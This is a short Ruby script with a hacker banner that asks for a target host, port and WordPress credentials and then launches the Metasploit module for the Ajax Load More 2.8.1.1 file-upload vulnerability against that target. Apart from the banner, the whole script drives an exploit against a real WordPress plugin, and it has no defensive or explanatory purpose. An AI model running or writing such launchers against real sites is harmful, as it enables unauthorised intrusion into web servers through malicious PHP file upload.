require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
   Wordpress Ajax Load More PHP Upload Vulnerability
         
              Ajax Load More 2.8.1.1
""".red
puts """
	      1st Try {set RPORT 3306, 80}

""".white


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp


puts " [?] What is The username to authenticate as? ".blue
print "[!] ---> ".yellow
name = gets.chomp

puts " [?] What is the password to authenticate with? ".blue
print " [!] ---> ".yellow
pass = gets.chomp




exec("msfconsole -x 'use exploit/unix/webapp/wp_ajax_load_more_file_upload' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg WP_USERNAME #{name}' -x 'setg WP_PASSWORD #{pass}' -x 'run'")

